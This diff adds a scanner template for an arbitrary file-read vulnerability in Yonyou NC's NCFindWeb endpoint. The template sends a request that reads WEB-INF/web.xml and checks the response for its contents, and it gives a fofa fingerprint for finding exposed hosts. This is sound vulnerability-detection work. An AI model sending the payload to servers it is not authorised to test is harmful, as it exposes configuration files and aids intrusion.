@@ -1,0 +1,29 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - <web-app
+          - </web-app>
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/NCFindWeb?service=IPreAlertConfigService&filename=WEB-INF/web.xml'
+id: yonyou-ncfindweb-fileread
+info:
+  author: princechaddha
+  description: |
+    用友 NC NCFindWeb 任意文件读取漏洞
+    fofa: icon_hash="1085941792"
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: 用友 NC NCFindWeb 任意文件读取漏洞
+  severity: high
+  tags: yonyou,ncfindweb,fileread,argus-import
